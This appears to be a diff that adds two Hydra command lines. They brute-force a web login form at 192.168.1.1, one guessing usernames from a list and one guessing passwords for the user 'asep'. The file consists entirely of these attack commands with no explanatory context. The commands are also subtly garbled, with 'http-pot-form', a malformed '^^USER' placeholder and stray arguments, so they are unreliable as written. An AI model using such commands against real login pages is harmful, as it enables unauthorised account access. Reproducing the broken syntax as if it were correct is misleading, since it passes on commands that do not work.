@@ -1,0 +1,2 @@
+hydra -L username.txt -p a 192.168.1.1 http-pot-form "/5qweasd/login:username=^^USER&password=^PASS^:Invalid username"
+hydra -l asep -P password.txt a 192.168.1.1 http-pot-form "/5qweasd/login:username=^^USER&password=^PASS^:Invalid password"
